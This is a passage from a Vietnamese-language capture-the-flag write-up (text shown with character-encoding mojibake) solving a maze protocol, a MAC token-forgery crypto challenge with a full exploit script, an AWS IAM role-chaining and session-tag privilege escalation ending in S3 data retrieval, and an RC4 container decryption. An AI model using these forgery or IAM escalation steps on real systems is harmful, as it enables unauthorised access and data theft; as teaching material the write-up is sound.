    return math.sqrt((x1 - tx)**2 + (y1 - ty)**2)

def make_packet(cmd, payload=b''):
    total_len = 8 + len(payload)
    return p32(MAGIC) + p8(1) + p8(cmd) + p16(total_len) + payload

def solve():
    # 1. K·∫øt n·ªëi & Handshake
    r = remote('ctf.csd.lol', 6969)
    r.send(make_packet(1))
    r.recvn(16)

    # 2. L·∫•y Target ID (Cmd 4)
    r.send(make_packet(4))
    header = r.recvn(8)
    msg = r.recvn(u16(header[6:8]) - 8).decode(errors='ignore')
    
    match = re.search(r'0x([0-9a-fA-F]+)', msg)
    if not match: return
    TARGET_ID = int(match.group(1), 16)
    TX, TY = get_pos(TARGET_ID)
    print(f"[+] Target: {hex(TARGET_ID)} -> ({TX}, {TY})")

    # 3. V√≤ng l·∫∑p t√¨m ƒë∆∞·ªùng
    visit_counts = defaultdict(int)
    
    while True:
        # L·∫•y tr·∫°ng th√°i hi·ªán t·∫°i (Cmd 2)
        r.send(make_packet(2))
        header = r.recvn(8)
        payload = r.recvn(u16(header[6:8]) - 8)

        if b'csd{' in payload:
            print(f"[SUCCESS] Flag: {payload.decode().strip()}")
            break

        cur_id = u32(payload[0:4])
        count = u32(payload[4:8])
        visit_counts[cur_id] += 1
        
        # Ki·ªÉm tra ƒë·∫øn ƒë√≠ch
        if cur_id == TARGET_ID:
            r.send(make_packet(4)) # G·ª≠i l·ªánh cu·ªëi l·∫•y flag
            print(r.recvall().decode())
            break

        # Ch·ªçn ƒë∆∞·ªùng ƒëi (Heuristic + Penalty)
        neighbors_raw = payload[8:]
        best_node = -1
        best_score = float('inf')

        for i in range(count):
            nid = u32(neighbors_raw[i*4 : (i+1)*4])
            # Score = Distance + (Visited_Count * Penalty)
            score = dist(nid, TX, TY) + (visit_counts[nid] * 100000)
            
            if score < best_score:
                best_score = score
                best_node = nid

        # Di chuy·ªÉn (Cmd 3)
        checksum = best_node ^ cur_id
        r.send(make_packet(3, p32(best_node) + p32(checksum)))
        r.recvn(12) # Nh·∫≠n ACK

if __name__ == "__main__":
    solve()
```

### K·∫øt lu·∫≠n
B√†i n√†y d·∫°y ch√∫ng ta r·∫±ng:
1.  **ƒê·ª´ng tin v√†o client m·∫´u:** Client ƒë·ªÅ b√†i cho th∆∞·ªùng b·ªã l·ªói ho·∫∑c thi·∫øu t√≠nh nƒÉng quan tr·ªçng (nh∆∞ x·ª≠ l√Ω Target ID).
2.  **Endianness r·∫•t quan tr·ªçng:** Ph·∫£i x√°c ƒë·ªãnh ƒë√∫ng Little Endian hay Big Endian khi l√†m vi·ªác v·ªõi binary protocol.
3.  **Thu·∫≠t to√°n:** Greedy ƒë∆°n thu·∫ßn kh√¥ng gi·∫£i ƒë∆∞·ª£c m√™ cung ph·ª©c t·∫°p, c·∫ßn th√™m c∆° ch·∫ø x·ª≠ l√Ω v√≤ng l·∫∑p (nh∆∞ ƒë·∫øm s·ªë l·∫ßn gh√© thƒÉm).

**Flag:** `csd{h00r4y_now_U_h4v3_a_dr0ne_army_5846a7b30c}`
{: .prompt-flag}

---

## Sealed for Delivery

### Analysis

Server cung c·∫•p m·ªôt d·ªãch v·ª• ƒëƒÉng k√Ω/ƒëƒÉng nh·∫≠p v√† x√°c th·ª±c token d·ª±a tr√™n ch·ªØ k√Ω ƒëi·ªán t·ª≠ (MAC).
M·ª•c ti√™u l√† ƒë·ªçc d·ªØ li·ªáu c·ªßa user `admin`, nh∆∞ng ta kh√¥ng bi·∫øt m·∫≠t kh·∫©u. Ta c·∫ßn gi·∫£ m·∫°o (forge) m·ªôt token h·ª£p l·ªá cho `admin`.

#### C∆° ch·∫ø t·∫°o MAC
H√†m t·∫°o MAC ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:
$$ \text{MAC}(m) = | g^{m \oplus s} \pmod p | $$

Trong ƒë√≥:
*   $p$: S·ªë nguy√™n t·ªë 257-bit (Ban ƒë·∫ßu server c√¥ng khai, sau ƒë√≥ ƒë√£ b·ªã ·∫©n).
*   $g$: Ph·∫ßn t·ª≠ sinh (Generator) (C≈©ng b·ªã ·∫©n).
*   $s$: Kh√≥a b√≠ m·∫≠t (Secret key) 256-bit.
*   $m$: Message bao g·ªìm `compress(username)` (192 bit) n·ªëi v·ªõi `timestamp` (64 bit).
*   Ph√©p to√°n $|x|$: N·∫øu k·∫øt qu·∫£ l·ªõn h∆°n $p/2$, l·∫•y $p - x$ (ƒë·ªÉ ƒë·∫£m b·∫£o t√≠nh ƒë·ªëi x·ª©ng).

#### Vulnerability
L·ªó h·ªïng n·∫±m ·ªü vi·ªác s·ª≠ d·ª•ng ph√©p **XOR** ($m \oplus s$) trong s·ªë m≈© c·ªßa b√†i to√°n Logarit r·ªùi r·∫°c. ƒêi·ªÅu n√†y cho ph√©p th·ª±c hi·ªán t·∫•n c√¥ng vi sai (**Differential Attack**):

N·∫øu ta c√≥ hai tin nh·∫Øn $m_1, m_2$ ch·ªâ kh√°c nhau ƒë√∫ng 1 bit t·∫°i v·ªã tr√≠ $k$, th√¨:
$$ m_1 \oplus s = E $$
$$ m_2 \oplus s = E \pm 2^k $$
Khi ƒë√≥ t·ªâ l·ªá gi·ªØa hai MAC s·∫Ω l√†:
$$ \frac{\text{MAC}(m_2)}{\text{MAC}(m_1)} \equiv g^{\pm 2^k} \pmod p $$

D·ª±a v√†o t√≠nh ch·∫•t n√†y, ta c√≥ th·ªÉ kh√¥i ph·ª•c tham s·ªë $p, g$ v√† to√†n b·ªô kh√≥a b√≠ m·∫≠t $s$.

### Exploitation

#### B∆∞·ªõc 1: Kh√¥i ph·ª•c P v√† G (Black-box Attack)
Do server ƒë√£ ·∫©n $p$ v√† $g$, ta c·∫ßn t√¨m l·∫°i ch√∫ng th√¥ng qua Oracle (c√°c c·∫∑p token thu th·∫≠p ƒë∆∞·ª£c).

1.  **Thu th·∫≠p d·ªØ li·ªáu:** Ta ƒëƒÉng nh·∫≠p li√™n t·ª•c ƒë·ªÉ l·∫•y c√°c c·∫∑p token c√≥ timestamp li·ªÅn k·ªÅ nhau: $(t, t+1)$.
2.  **T√¨m P:**
    *   V·ªõi c·∫∑p timestamp ch·∫µn-l·∫ª $(t, t+1)$, s·ª± kh√°c bi·ªát trong s·ªë m≈© ch·ªâ l√† $\pm 1$ (bit cu·ªëi c√πng).
    *   Ta c√≥ ph∆∞∆°ng tr√¨nh: $y_{t} \cdot y_{t'+1} \equiv \pm y_{t+1} \cdot y_{t'} \pmod p$.
    *   L·∫•y hi·ªáu c·ªßa hai v·∫ø v√† t√≠nh **GCD** (∆Ø·ªõc chung l·ªõn nh·∫•t) c·ªßa nhi·ªÅu c·∫∑p d·ªØ li·ªáu kh√°c nhau, ta t√¨m ƒë∆∞·ª£c $p$.
3.  **T√¨m G:**
    *   Sau khi c√≥ $p$, ta t√≠nh $g = y_{t+1} \cdot y_t^{-1} \pmod p$.

#### B∆∞·ªõc 2: Kh√¥i ph·ª•c Secret Key ($s$)

Chia l√†m 2 giai ƒëo·∫°n:
1.  **T√¨m $s_{low}$ (Ph·∫ßn Timestamp):**
    *   D·ª±a v√†o c√°c m·∫´u token ƒë√£ thu th·∫≠p
    *   T√¨m c√°c c·∫∑p timestamp l·ªách nhau ƒë√∫ng bit th·ª© $k$ ($t_1$ v√† $t_2 = t_1 \oplus 2^k$)
    *   So s√°nh t·ª∑ l·ªá MAC th·ª±c t·∫ø v·ªõi $g^{2^k}$. N·∫øu kh·ªõp d∆∞∆°ng th√¨ bit $s_k=0$, ng∆∞·ª£c l·∫°i $s_k=1$

2.  **T√¨m $s_{high}$ (Ph·∫ßn Username):**
    *   ƒêƒÉng k√Ω c√°c user kh√°c user g·ªëc (`'a'*32`) ƒë√∫ng 1 bit.
    *   L·∫•y token v√† **s·ª≠a l·ªói th·ªùi gian** (Time Correction) b·∫±ng $s_{low}$ ƒë√£ t√¨m ƒë∆∞·ª£c (ƒë·ªÉ ƒë∆∞a v·ªÅ c√πng m·ªëc th·ªùi gian ·∫£o).
    *   So s√°nh MAC ƒë·ªÉ t√¨m t·ª´ng bit c·ªßa ph·∫ßn username.

#### B∆∞·ªõc 3: Gi·∫£ m·∫°o Token (Forging)

Sau khi c√≥ $s$ (ho·∫∑c ƒë·ªß c√°c bit quan tr·ªçng), ta th·ª±c hi·ªán gi·∫£ m·∫°o:
1.  L·∫•y m·ªôt token h·ª£p l·ªá m·ªõi nh·∫•t c·ªßa user th∆∞·ªùng: $(info_{base}, mac_{base})$.
2.  T·∫°o th√¥ng tin cho admin: $\text{info}_{admin} = \text{compress(‚Äúadmin‚Äù)} + \text{timestamp}_{base}$.
3.  T√≠nh ƒë·ªô l·ªách s·ªë m≈©:
    $$ \Delta = (m_{admin} \oplus s) - (m_{base} \oplus s) $$
4.  T√≠nh MAC gi·∫£ m·∫°o:
    $$ mac_{admin} = mac_{base} \cdot g^{\Delta} \pmod p $$


### Script

```python
import json
import socket
import string
import time
import math
import sys
from Crypto.Util.number import long_to_bytes, inverse

HOST = 'ctf.csd.lol'
PORT = 2020

def solve():
    print(f"[*] Connecting {HOST}:{PORT}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return

    # Buffer to handle TCP stream (avoid packet splitting)
    buffer = ""
    def recv_json():
        nonlocal buffer
        while True:
            if "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                try:
                    return json.loads(line)
                except:
                    continue
            try:
                chunk = s.recv(4096).decode()
                if not chunk: return None
                buffer += chunk
            except:
                return None

    def send_json(data):
        s.sendall((json.dumps(data) + "\n").encode())

    # 1. Initialization
    print("[*] Waiting for Server response...")
    while True:
        data = recv_json()
        if data and "out" in data and "awaiting query" in data["out"]:
            break
    print("[+] Server is ready for attack.")

    def login(u):
        send_json({"option": "login", "username": u, "password": "p"})
        res = recv_json()
        if res and "info" in res:
            return res["info"], res["mac"]
        return None, None

    # ƒêƒÉng k√Ω user m·∫´u
    base_user = "a" * 32
    send_json({"option": "register", "username": base_user, "password": "p", "data": "d"})
    recv_json()

    # STEP 1: RECOVER P (MODULUS)
    print("[*] Collecting Timestamp samples (Server is slow, please be patient)...")
    samples = {}
    
    target_samples = 25 
    for i in range(target_samples):
        info, mac_hex = login(base_user)
        if info:
            ts = int.from_bytes(bytes.fromhex(info)[-8:], 'big')
            mac_val = int(mac_hex, 16)
            samples[ts] = mac_val
            sys.stdout.write(f"\r    -> Sample: {len(samples)}/{target_samples} (Last TS: {ts})")
            sys.stdout.flush()
        
        time.sleep(0.5) 

    # Filter pairs (t, t+1) with even t
    pairs = []
    sorted_ts = sorted(samples.keys())
    for t in sorted_ts:
        if (t % 2 == 0) and ((t + 1) in samples):
            pairs.append((samples[t], samples[t+1]))
    
    print(f"\n[+] Found {len(pairs)} valid timestamp pairs (Even->Odd).")
    if len(pairs) < 2:
        print("[-] Not enough pair data. Please retry or increase sample size.")
        return

    # --- ALGORITHM TO FIND P (BRANCHING GCD) ---
    print("[*] Calculating P...")
    y1_ref, y2_ref = pairs[0]
    
    # Create candidates from the first pair
    candidates_0 = [
        abs(y1_ref * pairs[1][1] - y2_ref * pairs[1][0]), # Cross product v·ªõi c·∫∑p th·ª© 2
        abs(y1_ref * pairs[1][1] + y2_ref * pairs[1][0])
    ]
    candidates_0 = [x for x in candidates_0 if x > 0]
    
    final_p = 1
    
    # Iterate through hypotheses
    for start_val in candidates_0:
        current_gcd = start_val
        valid_chain = True
        
        # Check with all remaining pairs
        for i in range(2, len(pairs)):
            y_next_a, y_next_b = pairs[i]
            val_a = abs(y1_ref * y_next_b - y2_ref * y_next_a)
            val_b = abs(y1_ref * y_next_b + y2_ref * y_next_a)
            
            gcd_a = math.gcd(current_gcd, val_a)
            gcd_b = math.gcd(current_gcd, val_b)
            
            # ∆Øu ti√™n GCD l·ªõn (~256 bit)
            if gcd_a > (1 << 240):
                current_gcd = gcd_a
            elif gcd_b > (1 << 240):
                current_gcd = gcd_b
            else:
                valid_chain = False
                break
        
        if valid_chain and current_gcd > (1 << 240):
            final_p = current_gcd
            break
            
    # Chu·∫©n h√≥a P
    while final_p.bit_length() > 258:
        final_p //= 2
        
    print(f"[+] Found P: {str(final_p)[:20]}... (Bits: {final_p.bit_length()})")
    if final_p.bit_length() < 250:
        print("[-] P found is too small or incorrect. Server might be lagging, please retry.")
        return
    p = final_p

    # STEP 2: FIND G (GENERATOR)
    print("[*] Calculating G...")
    try:
        y1, y2 = pairs[0]
        inv_y1 = inverse(y1, p)
        cand_g = (y2 * inv_y1) % p
        
        # Verify
        possible_gs = [cand_g, p-cand_g, inverse(cand_g, p), p-inverse(cand_g, p)]
        g = 0
        y3, y4 = pairs[1]
        
        for val in possible_gs:
            v1 = (y3 * val) % p
            v2 = (y3 * inverse(val, p)) % p
            if v1 == y4 or v1 == (p - y4) or v2 == y4 or v2 == (p - y4):
                g = val
                break
        if g == 0: g = cand_g # Fallback
        print(f"[+] Found G: {str(g)[:20]}...")
    except:
        print("[-] Error calculating G.")
        return

    # STEP 3: SOLVE SECRET AND FORGE
    # 3.1. s_low
    print("[*] Solving s_low...")
    s_low = 0
    for k in range(16):
        for t1, val1 in samples.items():
            t2 = t1 ^ (1 << k)
            if t2 in samples:
                val2 = samples[t2]
                diff = t1 - t2
                g_factor = pow(g, abs(diff), p)
                if diff < 0: g_factor = inverse(g_factor, p)
                ratio = (val1 * inverse(val2, p)) % p
                if ratio == g_factor or ratio == (p - g_factor):
                    s_low &= ~(1 << k)
                else: s_low |= (1 << k)
                break

    # 3.2. s_high
    print("[*] Solving s_high (Bruteforce 192 bits - Takes about 2-3 minutes)...")
    s_high = 0
    
    # Get the latest base
    info_base, mac_base = login(base_user)
    ts_base = int.from_bytes(bytes.fromhex(info_base)[-8:], 'big')
    y_base = int(mac_base, 16)
    
    printable = string.digits + string.ascii_letters
    chars = printable[:62] + "-_"

    for k in range(192):
        if k % 10 == 0: sys.stdout.write(f"\r    Progress: {k}/192 bits...")
        
        char_idx = k // 6
        bit_idx = k % 6
        new_char_code = 10 ^ (1 << bit_idx) # 'a' is index 10
        
        u_list = list(base_user)
        u_list[char_idx] = chars[new_char_code]
        u_new = "".join(u_list)
        
        send_json({"option": "register", "username": u_new, "password": "p", "data": "d"})
        recv_json() # consume
        
        info_k, mac_k = login(u_new)
        ts_k = int.from_bytes(bytes.fromhex(info_k)[-8:], 'big')
        y_k = int(mac_k, 16)
        
        # Time correction
        t_xor_sk = (ts_k & 0xFFFF) ^ s_low
        t_xor_sb = (ts_base & 0xFFFF) ^ s_low
        diff_time = t_xor_sk - t_xor_sb
        
        g_fix = pow(g, abs(diff_time), p)
        if diff_time < 0: g_fix = inverse(g_fix, p)
        y_k_fix = (y_k * inverse(g_fix, p)) % p
        
        g_bit = pow(g, pow(2, k+64, p-1), p)
        ratio = (y_k_fix * inverse(y_base, p)) % p
        
        u_bit_new = (new_char_code >> bit_idx) & 1
        is_match = (ratio == g_bit or ratio == (p - g_bit))
        
        s_bit = 0 if ((is_match and u_bit_new==1) or (not is_match and u_bit_new==0)) else 1
        if s_bit: s_high |= (1 << k)

    print("\n[+] s_high completed.")

    # 3.3. Forge
    print("[*] Sending payload to get the flag...")
    info_final, mac_final = login(base_user)
    y_real = int(mac_final, 16)
    
    def compress(u):
        padded = u.rjust(32, "_")
        val = 0
        for i, c in enumerate(padded): val += chars.index(c) << (6 * i)
        return val

    m_base = compress(base_user)
    m_target = compress("admin")
    
    exp_diff = ((m_target ^ s_high) - (m_base ^ s_high)) * (1 << 64)
    g_diff = pow(g, abs(exp_diff), p)
    if exp_diff < 0: g_diff = inverse(g_diff, p)
    
    y_forge = (y_real * g_diff) % p
    if y_forge > p // 2: y_forge = p - y_forge
    
    info_forge = long_to_bytes(m_target, 24) + bytes.fromhex(info_final)[-8:]
    
    send_json({
        "option": "read",
        "username": "admin",
        "info": info_forge.hex(),
        "mac": long_to_bytes(y_forge, 32).hex()
    })
    
    res = recv_json()
    print("FLAG:", res)
    s.close()

if __name__ == "__main__":
    solve()
```


> **Flag:** `csd{n0t_5uch_@_g00d_s1gn4tur3_5chem3}`
{: .prompt-flag}

*Note: B√†i h·ªçc r√∫t ra l√† kh√¥ng bao gi·ªù ƒë∆∞·ª£c k·∫øt h·ª£p c√°c ph√©p to√°n tuy·∫øn t√≠nh (nh∆∞ XOR) tr·ª±c ti·∫øp v√†o c√°c b√†i to√°n kh√≥ v·ªÅ s·ªë h·ªçc (nh∆∞ Discrete Log) m√† kh√¥ng qua c√°c h√†m bƒÉm (Hash) an to√†n.*

---

## Trust Issues

> **Category:** Miscellaneous
{: .prompt-info}

### 1. Kh·ªüi t·∫°o & C·∫•u h√¨nh (Initial Access)
Ban ƒë·∫ßu, ch√∫ng ta ƒë∆∞·ª£c c·∫•p m·ªôt c·∫∑p Credential c√≥ quy·ªÅn h·∫°n th·∫•p. Vi·ªác ƒë·∫ßu ti√™n l√† c√†i ƒë·∫∑t c√¥ng c·ª• v√† c·∫•u h√¨nh profile.

**C·∫•u h√¨nh AWS CLI:**
```bash
aws configure --profile ctf
# Access Key: test
# Secret Key: test
# Region: us-east-1
# Output: json
```
*L∆∞u √Ω quan tr·ªçng:* V√¨ ƒë√¢y l√† m√¥i tr∆∞·ªùng gi·∫£ l·∫≠p, m·ªçi c√¢u l·ªánh ƒë·ªÅu b·∫Øt bu·ªôc ph·∫£i k√®m c·ªù `--endpoint-url https://trust-issues.csd.lol`.

### 2. Thu th·∫≠p th√¥ng tin (Reconnaissance)
Ki·ªÉm tra c√°c Role ƒëang t·ªìn t·∫°i trong h·ªá th·ªëng ƒë·ªÉ t√¨m ƒë∆∞·ªùng leo thang.

**L·ªánh:**
```bash
aws --endpoint-url https://trust-issues.csd.lol iam list-roles --profile ctf
```

**Ph√¢n t√≠ch k·∫øt qu·∫£:**
Sau khi xem x√©t c√°c `AssumeRolePolicyDocument`, ta ph√°t hi·ªán ra m·ªôt chu·ªói tin t∆∞·ªüng (Trust Chain) nh∆∞ sau:

1.  **Role hi·ªán t·∫°i:** `npld-ext-2847`
2.  **Role trung gian:** `svc-elf-cicd-runner`
    *   *Trust Policy:* Cho ph√©p `npld-ext-2847` th·ª±c hi·ªán `sts:AssumeRole`.
3.  **Role m·ª•c ti√™u:** `s3-xfer-npld-vault-rw`
    *   *Trust Policy:* Cho ph√©p `svc-elf-cicd-runner` th·ª±c hi·ªán `sts:AssumeRole`.
    *   *ƒêi·ªÅu ki·ªán (Condition):* B·∫Øt bu·ªôc ph·∫£i c√≥ tag `team=warehouse`.

### 3. Khai th√°c l·ªó h·ªïng (Exploitation)

#### B∆∞·ªõc 1: Leo thang l√™n Role trung gian
Ch√∫ng ta "nh·∫≠p vai" v√†o role `svc-elf-cicd-runner`.

**L·ªánh:**
```bash
aws --endpoint-url https://trust-issues.csd.lol sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/svc-elf-cicd-runner \
    --role-session-name runner-session \
    --profile ctf
```

Sau khi l·∫•y ƒë∆∞·ª£c `AccessKeyId`, `SecretAccessKey`, `SessionToken`, ta thi·∫øt l·∫≠p bi·∫øn m√¥i tr∆∞·ªùng:
```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

#### B∆∞·ªõc 2: Leo thang l√™n Role cao nh·∫•t (Bypass ABAC)
Role cu·ªëi c√πng y√™u c·∫ßu `Principal` l√† role trung gian (ƒë√£ c√≥) V√Ä ph·∫£i k√®m theo Tags. ƒê√¢y l√† k·ªπ thu·∫≠t khai th√°c Attribute-Based Access Control.

**L·ªánh:**
```bash
# Set region ƒë·ªÉ tr√°nh l·ªói configure
export AWS_DEFAULT_REGION="us-east-1"

# Assume role k√®m theo Tags
aws --endpoint-url https://trust-issues.csd.lol sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/s3-xfer-npld-vault-rw \
    --role-session-name final-step \
    --tags Key=team,Value=warehouse
```

Ti·∫øp t·ª•c c·∫≠p nh·∫≠t bi·∫øn m√¥i tr∆∞·ªùng v·ªõi credentials m·ªõi nh·∫≠n ƒë∆∞·ª£c (Role `s3-xfer-npld-vault-rw`).

### Truy t√¨m Flag (Data Exfiltration)
V·ªõi quy·ªÅn h·∫°n ƒë·ªçc/ghi v√†o Vault (`vault-rw`), ta ti·∫øn h√†nh ki·ªÉm tra S3 Buckets.

**Li·ªát k√™ Buckets:**
```bash
aws --endpoint-url https://trust-issues.csd.lol s3 ls
# K·∫øt qu·∫£ th·∫•y bucket kh·∫£ nghi: npld-backup-vault-7f3a
```

**Kh√°m ph√° n·ªôi dung Bucket:**
```bash
aws --endpoint-url https://trust-issues.csd.lol s3 ls s3://npld-backup-vault-7f3a/
# Th·∫•y th∆∞ m·ª•c: classified/
# (File readme.txt ·ªü ngo√†i l√† c√∫ l·ª´a)
```

**ƒêi s√¢u v√†o th∆∞ m·ª•c m·∫≠t:**
```bash
aws --endpoint-url https://trust-issues.csd.lol s3 ls s3://npld-backup-vault-7f3a/classified/
# T√¨m th·∫•y file: wishlist-backup.txt
```

**L·∫•y Flag:**
```bash
aws --endpoint-url https://trust-issues.csd.lol s3 cp s3://npld-backup-vault-7f3a/classified/wishlist-backup.txt -
```

> **Flag:** `csd{sO_M4NY_VUln3R48L3_7H1Ngs_7H3S3_d4yS_s1gh_bc653}`
{:.prompt-flag}

---
**B√†i h·ªçc r√∫t ra:**
1.  Lu√¥n ki·ªÉm tra k·ªπ **Trust Policy** c·ªßa c√°c IAM Role.
2.  Hi·ªÉu v·ªÅ c∆° ch·∫ø **Chaining Assume Role** (nh·∫£y t·ª´ role n√†y sang role kh√°c).
3.  L∆∞u √Ω c√°c ƒëi·ªÅu ki·ªán (`Condition`) trong Policy, ƒë·∫∑c bi·ªát l√† c√°c y√™u c·∫ßu v·ªÅ **Tags** (Session Tags).

---

## Custom Packaging

> **Category:** Forensics
{: .prompt-info}

### T·ªïng quan
*   **Challenge:** Custom Packaging
*   **File cung c·∫•p:** `ks_operations.kcf`
*   **M·ª•c ti√™u:** Gi·∫£i m√£ file container ƒë·ªãnh d·∫°ng l·∫° (`.kcf`), tr√≠ch xu·∫•t n·ªôi dung b√™n trong v√† t√¨m c·ªù (Flag).
*   **Manh m·ªëi ban ƒë·∫ßu:** File s·ª≠ d·ª•ng m√£ h√≥a d√≤ng (Stream Cipher - RC4), version theo nƒÉm, key ƒë·ªïi v√†o th√°ng 1.

### Ph√¢n t√≠ch Header & C·∫•u tr√∫c File
D·ª±a v√†o m√¥ t·∫£ ƒë·ªÅ b√†i, ta ph√¢n t√≠ch 128 bytes ƒë·∫ßu ti√™n (Header) c·ªßa file b·∫±ng Python `struct`:

*   **Magic:** `KCF\0` (X√°c nh·∫≠n ƒë√∫ng ƒë·ªãnh d·∫°ng).
*   **Nonce (16 bytes):** Offset 0x08. D√πng ƒë·ªÉ sinh key.
*   **Timestamp (8 bytes):** Offset 0x18.
*   **File Count (2 bytes):** Offset 0x20.
*   **FAT Offset & Data Offset:** X√°c ƒë·ªãnh v·ªã tr√≠ b·∫£ng ph√¢n b·ªï file v√† v√πng d·ªØ li·ªáu.

Tuy nhi√™n, m·ªçi th·ª© sau Header (FAT v√† Data) ƒë·ªÅu b·ªã m√£ h√≥a.

### T√¨m ra Identifier v√† Master Key (Hint 1)

ƒê·ªÅ b√†i ƒë∆∞a ra g·ª£i √Ω quan tr·ªçng ƒë·∫ßu ti√™n (**Hint 1**):
> **Hint 1:** `Master key = SHA256(nonce || timestamp_LE || file_count_LE || identifier)`. Identifier l√† chu·ªói **6 k√Ω t·ª± th∆∞·ªùng (lowercase alphanumeric: a-z, 0-9)**.

#### Suy lu·∫≠n Identifier:
ƒê√¢y l√† b∆∞·ªõc kh√≥ nh·∫•t. Thay v√¨ brute-force m√π qu√°ng, ta x√¢u chu·ªói c√°c d·ªØ ki·ªán t·ª´ m√¥ t·∫£ ("Chatter log"):
1.  Nh√≥m hacker t·ª± g·ªçi m√¨nh l√† **"KS"**.
2.  H·ªç qu·∫£n l√Ω phi√™n b·∫£n theo nƒÉm (**"version everything by year"**) &rarr; NƒÉm hi·ªán t·∫°i l√† **2025**.
3.  File t√™n l√† `ks2025_ops_final.kcf`.
4.  Hint y√™u c·∫ßu **6 k√Ω t·ª±**, bao g·ªìm ch·ªØ th∆∞·ªùng v√† s·ªë.

K·∫øt h·ª£p l·∫°i: `ks` + `2025` = **`ks2025`**.
Chu·ªói n√†y th·ªèa m√£n ho√†n to√†n ƒëi·ªÅu ki·ªán: 6 k√Ω t·ª±, alphanumeric, kh·ªõp ng·ªØ c·∫£nh.

#### Ki·ªÉm ch·ª©ng:
Khi d√πng `ks2025` ƒë·ªÉ t·∫°o Master Key v√† gi·∫£i m√£ v√πng FAT, ta thu ƒë∆∞·ª£c k·∫øt qu·∫£ c√≥ c·∫•u tr√∫c r·∫•t r√µ r√†ng (Offset b·∫Øt ƒë·∫ßu b·∫±ng 0, Size l√† s·ªë d∆∞∆°ng h·ª£p l√Ω), thay v√¨ d·ªØ li·ªáu r√°c ng·∫´u nhi√™n. ƒêi·ªÅu n√†y x√°c nh·∫≠n `ks2025` l√† ch√≠nh x√°c.

### Gi·∫£i m√£ t·ª´ng File (Hint 2)

Sau khi gi·∫£i m√£ FAT, ta c√≥ danh s√°ch c√°c file (Offset, Size). Tuy nhi√™n, d√πng Master Key ƒë·ªÉ gi·∫£i m√£ v√πng Data l·∫°i ra r√°c. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn g·ª£i √Ω th·ª© hai (**Hint 2**):

> **Hint 2:** `Per-file key = SHA256(master_key || file_index || file_offset)`, truncated by a certain amount. Same endianness conventions apply.

#### C√¥ng th·ª©c Derived Key:
T·ª´ hint n√†y, ta x√¢y d·ª±ng ƒë∆∞·ª£c quy tr√¨nh gi·∫£i m√£ cho t·ª´ng file:
1.  **Input:**
    *   `Master Key`: 32 bytes (ƒë√£ t√¨m ƒë∆∞·ª£c ·ªü b∆∞·ªõc 3).
    *   `File Index`: S·ªë th·ª© t·ª± file (0, 1, 2...) d·∫°ng 4 bytes Little Endian (`<I`).
    *   `File Offset`: Offset c·ªßa file l·∫•y t·ª´ FAT, d·∫°ng 8 bytes Little Endian (`<Q`).
2.  **Hash:** `SHA256(MasterKey + Index + Offset)`.
3.  **Truncate:** RC4 ti√™u chu·∫©n th∆∞·ªùng d√πng Key 128-bit, n√™n ta c·∫Øt chu·ªói Hash l·∫•y **16 bytes ƒë·∫ßu ti√™n**.

### Script

```python
import struct
import hashlib
import os
from Crypto.Cipher import ARC4

def solve():
    filename = "ks_operations.kcf"
    # 1. Identifier t√¨m ƒë∆∞·ª£c qua suy lu·∫≠n logic (KS + Year)
    identifier = b"ks2025"
    
    with open(filename, "rb") as f:
        header = f.read(128)
        
        # --- PHASE 1: RECOVER MASTER KEY (HINT 1) ---
        # C·∫•u tr√∫c: Nonce(16) + Timestamp(8) + FileCount(2) + Identifier
        nonce = header[8:24]
        timestamp = header[24:32]
        file_count_bytes = header[32:34]
        
        salt = nonce + timestamp + file_count_bytes
        master_key = hashlib.sha256(salt + identifier).digest()
        print(f"[+] Master Key generated with identifier: {identifier.decode()}")

        # --- PHASE 2: DECRYPT FAT ---
        fat_offset = struct.unpack('<Q', header[0x22:0x2A])[0]
        fat_size = struct.unpack('<I', header[0x2A:0x2E])[0]
        data_offset = struct.unpack('<Q', header[0x2E:0x36])[0]
        
        f.seek(fat_offset)
        cipher_fat = ARC4.new(master_key)
        fat_data = cipher_fat.decrypt(f.read(fat_size))
        
        entry_size = 96
        num_files = len(fat_data) // entry_size
        print(f"[+] Found {num_files} files in FAT.")
        
        out_dir = "final_extracted"
        if not os.path.exists(out_dir): os.makedirs(out_dir)
        
        # --- PHASE 3: EXTRACT FILES (HINT 2) ---
        for index in range(num_files):
            entry = fat_data[index*entry_size : (index+1)*entry_size]
            
            # Parse Metadata t·ª´ FAT Entry ƒë√£ gi·∫£i m√£
            # Byte 4-12: Offset (8 bytes LE)
            # Byte 12-16: Size (4 bytes LE)
            file_off = struct.unpack('<Q', entry[4:12])[0]
            file_sz = struct.unpack('<I', entry[12:16])[0]
            
            # T·∫°o Key con cho file
            # Key = SHA256(Master + Index + Offset)[:16]
            idx_bytes = struct.pack('<I', index)
            off_bytes = struct.pack('<Q', file_off)
            
            derive_input = master_key + idx_bytes + off_bytes
            file_key = hashlib.sha256(derive_input).digest()[:16] # Truncate to 128-bit
            
            # Gi·∫£i m√£ Data
            f.seek(data_offset + file_off)
            encrypted_data = f.read(file_sz)
            
            cipher_file = ARC4.new(file_key)
            plain_data = cipher_file.decrypt(encrypted_data)
            
            # Tr√≠ch xu·∫•t file
            # File ƒë·∫ßu ti√™n l√† Office/Zip, c√°c file sau c√≥ th·ªÉ l√† .bin ch·ª©a flag
            fname = f"extracted_{index}.bin"
            
            # Check magic bytes ƒë·ªÉ ƒë·ªïi ƒëu√¥i cho ƒë·∫πp (Optional)
            if plain_data.startswith(b'\x50\x4B'): fname = f"file_{index}.docx"
            elif plain_data.startswith(b'\xD0\xCF'): fname = f"file_{index}.doc"
            
            with open(os.path.join(out_dir, fname), "wb") as w:
                w.write(plain_data)
                
    print(f"[SUCCESS] All files extracted to '{out_dir}'. Check them for the flag!")

if __name__ == "__main__":
    solve()
```

### K·∫øt qu·∫£
Sau khi ch·∫°y script, th∆∞ m·ª•c `final_extracted` ch·ª©a c√°c file ƒë√£ gi·∫£i m√£.
*   `file_0.docx`: M·ªôt t√†i li·ªáu Microsoft Word (nh∆∞ th√¥ng tin t√¨nh b√°o g·ª£i √Ω).
